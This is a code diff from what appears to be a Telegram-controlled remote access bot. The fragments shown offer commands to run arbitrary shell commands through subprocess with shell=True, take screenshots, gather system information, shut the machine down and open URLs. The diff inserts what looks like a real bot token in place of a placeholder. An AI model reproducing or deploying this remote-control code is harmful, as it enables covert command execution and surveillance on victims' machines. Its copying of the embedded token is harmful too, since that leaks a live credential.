@@ -20,7 +20,7 @@ from comtypes import CLSCTX_ALL, CoInitialize, CoUninitialize
 import pygame
 import pyperclip
 
-bot_token = 'your bot token from -> @BotFather'
+bot_token = '7615104148:AAFk0NVPm-tpooR-83rY7tpFHr0K58VpIHk'
 bot = telebot.TeleBot(bot_token)
 
 cmd_spam_processes = []
@@ -63,7 +63,7 @@ def send_welcome(message):
         message.chat.id,
         "Welcome to the multi-device bot!\n\n"
         "Commands:\n"
-        "/cmd <command> - Run a command\n"
+        "/cmd command - Run a command\n"
         "/screen - Take a screenshot\n"
         "/info - Get system information\n"
         "/shutdown - Shutdown the system\n"
@@ -412,13 +412,13 @@ def run_command(message):
     try:
         args = message.text.split(' ', 2)
         if len(args) < 2:
-            bot.send_message(message.chat.id, "Usage: /cmd <command>")
+            bot.send_message(message.chat.id, "Usage: /cmd command")
             return
 
         command = message.text[len('/cmd '):].strip()
         
         if not command:
-            bot.send_message(message.chat.id, "Usage: /cmd <command>")
+            bot.send_message(message.chat.id, "Usage: /cmd command")
             return
 
         subprocess.Popen(command, shell=True)
@@ -540,7 +540,7 @@ def open_url(message):
     try:
         args = message.text.split(' ', 2)
         if len(args) < 2:
-            bot.send_message(message.chat.id, "Usage: /open_url <url>")
+            bot.send_message(message.chat.id, "Usage: /open_url url")
             return
 
         url = args[1]
